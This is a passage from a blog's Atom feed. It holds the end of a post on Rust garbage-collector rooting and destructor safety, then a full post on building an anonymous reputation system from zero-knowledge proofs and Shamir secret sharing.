which <em>own</em> <code>Root</code> things to be considered roots.</p>

<p>The alternative is to not require this, and solely rely on <a href="https://doc.rust-lang.org/stable/nomicon/phantom-data.html"><code>PhantomData</code></a>. <code>Vec&lt;T&gt;</code> also
contains a <code>PhantomData&lt;T&gt;</code>, which gives the compiler a hint that it owns a <code>T</code>. On the other hand,
<code>Iter&lt;'a, T&gt;</code> contains a <code>PhantomData&lt;&amp;'a T&gt;</code>, which hints that it borrows a <code>T</code>. This is already
used by the compiler to determine drop soundness, so we can just use the same thing to determine
<code>Root</code> types. This is already supported by the autotrait infrastructure.</p>

<p>A downside here is that we&rsquo;re relying more on producers of unsafe code remembering to use
<code>PhantomData</code>. I&rsquo;m not 100% certain about this, but triggering dropck unsoundness by neglecting
<code>PhantomData</code> is still pretty hard (and often requires types like arenas), whereas forgetting a root
can very easily cause a GC segfault. I do not consider this to be a major downside.</p>

<h3>Finalizers and Drop</h3>

<p>The following code is unsafe:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Bar</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">baz</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Baz</span><span class="o">&gt;</span> <span class="c1">// baz can contain a Bar</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">impl</span> <span class="nb">Drop</span> <span class="k">for</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="nb">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="o">*</span><span class="n">bar</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// or</span>
</span><span class='line'>        <span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">baz</span><span class="p">.</span><span class="n">bar</span><span class="p">.</span><span class="n">borrow_mut</span><span class="p">()</span> <span class="o">=</span> <span class="n">bar</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Foo itself is used as a `Gc&lt;Foo&gt;`</span>
</span></code></pre></td></tr></table></div></figure>


<p>The problem is that destructors run in the sweep cycle of a GC, in some order. This means that <code>bar</code>
may have already been collected when <code>Foo</code>&rsquo;s destructor runs. While in many cases this can be solved
with a smart collection alrogithm, in the case where there&rsquo;s a cycle being collected there&rsquo;s nowhere
safe to start.</p>

<p>Additionally, further mutation of the graph after collection may extend the lifetime of a to-be-
collected variable.</p>

<p>A simple solution is to forbid all GC accesses during the collection phase. However, this means
dereferences too, and this will incur a cost on all GCd types &ndash; they stop being simple pointer
accesses. This solution places the burden on the GC implementor, instead of the compiler.</p>

<p>We have enough information in the type system to solve this &ndash; we can forbid <code>Drop</code> impls on types
which are explicitly <code>Root</code>. But it turns out that this isn&rsquo;t enough. Consider:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">trait</span> <span class="n">MyTrait</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">do_the_thing</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">struct</span> <span class="n">HijackableType</span><span class="o">&lt;</span><span class="n">T</span><span class="o">:</span> <span class="n">MyTrait</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="n">T</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="nb">Drop</span> <span class="k">for</span> <span class="n">HijackableType</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="nb">drop</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="bp">self</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">do_the_thing</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// in other library</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">inner</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="n">Baz</span><span class="o">&gt;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyTrait</span> <span class="k">for</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">do_the_thing</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="o">*</span><span class="bp">self</span><span class="p">.</span><span class="n">inner</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>Foo&lt;Bar&gt;</code> now has an unsafe destructor. Stopping this behavior requres forbidding Drop impls on
structs with trait bounds, but that is too restrictive.</p>

<p>This may end up having a similar solution to the &ldquo;all roots must be <code>Trace</code>&rdquo; issue. Warning on
monomorphizations isn&rsquo;t enough, we need to be able to allow <code>Vec&lt;ContainsRoot&gt;</code>, but not
<code>HijackableType&lt;ContainsRoot&gt;</code>. Making this distinction without poisoning half the generics out
there is tricky.</p>

<p>The notion of a hijackable type is actually already important for sound generic drop impls, see
<a href="https://github.com/rust-lang/rfcs/blob/master/text/1327-dropck-param-eyepatch.md">RFC 1327 (dropck eyepatch)</a>, <a href="https://github.com/rust-lang/rfcs/blob/master/text/1238-nonparametric-dropck.md">RFC 1238 (nonparametrick dropck)</a>,
and their predecessor, <a href="https://github.com/rust-lang/rfcs/blob/master/text/0769-sound-generic-drop.md">RFC 0769 (sound generic drop)</a>. We might be able to rely
on this, but would need to introduce additional constraints in dropck.</p>

<p>Fortunately, there is always the fallback solution of requiring the implementor to enforce this
constraint at runtime.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Firefox does have a garbage collector and a cycle collector which interact, though, so it&rsquo;s not something which is unthinkable.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>If there is an active stack drop flag for the value, that will need to be included too.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fun Crypto Problem: Designing an Anonymous Reputation System]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system/"/>
    <updated>2016-08-14T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2016/08/14/fun-crypto-problem-designing-an-anonymous-reputation-system</id>
    <content type="html"><![CDATA[<p>One of the reasons I like crypto is that it&rsquo;s a gold mine of interesting problems which feel
like they are impossible to solve and if a solution exists, it must be magic.</p>

<p>The other day, I came across one such problem <a href="https://twitter.com/SarahJamieLewis/status/763060674956173314">here</a>, by @SarahJamieLewis</p>

<blockquote><p>Is there a scheme where A can give reputation points to B, &amp; later, B presenting as C can prove
their reputation (without revealing A or B)?</p></blockquote>

<p>(I recommend trying to solve this yourself before reading ahead)</p>

<p>The problem isn&rsquo;t completely defined because we don&rsquo;t know how &ldquo;reputation&rdquo; is supposed to work. A
simple model is to think of it as currency, and use Bitcoin as a proxy. Of course, a real reputation
system probably would be different from currency. There might only be a small set of authorized
reputation &ldquo;sellers&rdquo; (this can still be built on top of Bitcoin, or you can use a system similar to
the CA system for TLS certificates). Or there might be a system in which each person can vote for
another person at most once (though this needs to be designed in a way that is resilient to sybil
attacks).</p>

<p>Let us assume that there is a ledger out there, where each ledger entry is a certificate saying that
entity X has given one reputation point to entity Y. A public key is included, where the private key
is only known to Y. This model cleanly applies to both Bitcoin and CA systems &ndash; in Bitcoin, the
transaction is the &ldquo;certificate&rdquo;, and in the CA system the certificate is the certificate.</p>

<p>For additional anonymity, you can have a different private key for each certificate. I&rsquo;m going to
assume this is the case, though the solutions don&rsquo;t change much if it isn&rsquo;t.</p>

<h2>Solution via ZKP</h2>

<p>I&rsquo;m very fond of the concept of a zero-knowledge proof, and when you have a hammer everything looks
like a nail.</p>

<p>So my first solution was one involving zero-knowledge proofs.</p>

<p>Construct the problem &ldquo;Given the certificates in this ledger and X private keys, prove that these
private keys each have one certificate they correspond to, and that the keys are distinct&rdquo;.</p>

<p>In this problem, the certificates (public keys) are hardcoded, whereas the private keys are inputs.
This sort of algorithm can be written as a sequential logic circuit, assuming that the method of
signing can be. We can then perform a zero-knowledge proof of this problem using the ZKP for general
execution <a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">outlined here</a>. The prover inserts their private keys into the algorithm,
run the algorithm, and prove that the execution was faithful and had an output of true using the ZKP.</p>

<p>Since the ZKP doesn&rsquo;t leak any information about its inputs, it doesn&rsquo;t leak which certificates
were the ones for which the prover had private keys, so it doesn&rsquo;t leak the identities of A or B.</p>

<p>However, this is overkill. The general ZKP gets very expensive as the size of the algorithm, and
since the ledger was hardcoded in it, this ZKP will probably take a while (or a lot of computational
power) to execute. One can perform it with a subset of the ledger picked by the prover, but
repeating the process may slowly reveal the identity of the prover via the intersection of these
subsets.</p>

<h2>Solution via secret-sharing</h2>

<p>(This solution is technically a ZKP too, but it doesn&rsquo;t use the &ldquo;general&rdquo; ZKP algorithm which
while expensive can be used for any combinatorical verification algorithm)</p>

<p>Once I&rsquo;d gotten the &ldquo;use a ZKP!&rdquo; solution out of my system, I thought about it more and realized
that the problem is very close to a secret-sharing one.</p>

<p>Secret-sharing is when you want to have a cryptographic &ldquo;lock&rdquo; (a shared secret) which can only be
revealed/opened when the requisite quorum of (any) X keys out of N total keys is used.</p>

<p>Shamir&rsquo;s secret sharing is a nice algorithm using polynomials that lets you do this.</p>

<p>In this situation, we want to prove that we have X private keys out of N total certificates in the
ledger.</p>

<p>The verifier (Victor) can construct a secret sharing problem with a single secret and N secret-
sharing-keys (in the case of Shamir, these would be N x,y-coordinate pairs). Each such key is paired
with a certificate, and is encrypted with the corresponding public key of that certificate.</p>

<p>The prover (Peggy) is given all of these encrypted secret-sharing keys, as well as the certificates
they correspond to.</p>

<p>If Peggy legitimately has X reputation, she has the X private keys necessary to obtain X of the
secret sharing keys by decrypting them. From this, she can obtain the secret. By showing the secret
to Victor, she has proven that she has at least X private keys corresponding to certificates in the
ledger, and thus has at least X reputation. In the process, <em>which</em> certificates were involved is
not revealed (so both the reputation-giver and reputation-receiver) stay anonymous.</p>

<p>Or was it?</p>

<p>Victor can construct a malicious secret sharing problem. Such a problem would basically reveal a
different secret depending on the secret-sharing-keys Peggy uses. For example, in Shamir&rsquo;s secret
sharing, Victor can just give N random coordinates. X of those coordinates will always create a
degree-X curve, but the curves obtained from different sets of X coordinates will probably have a
different constant term (and thus a different secret).</p>

<p>The secret-sharing problem needs to be transmitted in a way that makes it possible for Peggy to
verify that it&rsquo;s not malicious.</p>

<p>One way to do it is to make it possible to uncover <em>all</em> the secret-sharing-keys, but <em>only</em> after
the secret has been found. In Shamir&rsquo;s algorithm, this can be done by pre-revealing the x
coordinates and only encrypting the y coordinates. Once Peggy has found the secret, she has the
entire polynomial curve, and can input the remaining x coordinates into the curve to find the
remaining secret sharing keys (and then verify that they have been encrypted properly).</p>

<p>This is <em>almost perfect</em>. User &ldquo;otus&rdquo; on Crypto Stack Exchange <a href="http://crypto.stackexchange.com/q/39274/2081">pointed out my mistake</a>.</p>

<p>The problem with this scheme (and the previous one to a lesser degree) is that Peggy could simply
brute-force the values of the y coordinates beforehand.</p>

<p>This can be solved by using nonces. Instead of encrypting each y-coordinate, Victor encrypts each
y-coordinate, <em>plus a nonce</em>. So, instead of encrypting the y-coordinate &ldquo;42&rdquo;, a string like
&ldquo;da72ke8lv0q-42&rdquo; will be encrypted.</p>

<p>On decryption, it is easy to extract the coordinate from the plaintext (presumably the scheme used
to add the nonce would be decided upon beforehand). However, we can&rsquo;t brute-force for the plaintext
anymore, because the ciphertext isn&rsquo;t the encryption of a low-entropy value like a regular, smallish
number, it&rsquo;s the encryption of a relatively high-entropy value.</p>

<p>So far, this prevents brute forcing, but it also prevents Peggy from verifying that the secret-
sharing problem was non-malicious, since she doesn&rsquo;t know the nonces. Nor can these be pre-shared
with her, since she can just use them to brute force again.</p>

<p>The solution here is for Victor to use the shared secret as a symmetric key, encrypt all of the
nonces with it, and share them with Peggy. Until Peggy knows this key, she cannot use the nonces to
brute force. Once she knows this key, she can decrypt the values for the nonces and use them to
verify that the nonces are correct.</p>

<p>This is exactly the property we need. If Peggy doesn&rsquo;t have enough private keys (reputation points),
she won&rsquo;t have the secret and can&rsquo;t prove her reputation to Victor. Once Peggy does have the quorum
of keys, she will know the symmetric key, be able to decrypt the nonces, and use these nonces to
verify that the other N-X ciphertexts fall on the curve which she has obtained. Once she has
verified this, she can present the shared secret/symmetric key to Victor, who will know that she
had enough keys to crack the secret sharing problem and thus has at least X reputation.</p>

<hr />

<p>This was quite an entertaining problem to solve (and it got me thinking about ZKPs again, which
made me write my <a href="http://manishearth.github.io/blog/2016/08/10/interactive-sudoku-zero-knowledge-proof/">previous post</a>). Thanks, Sarah!</p>

<p>Got an alternate solution (or other similar fun problems)? Let me know!</p>
]]></content>
  </entry>
  
</feed>
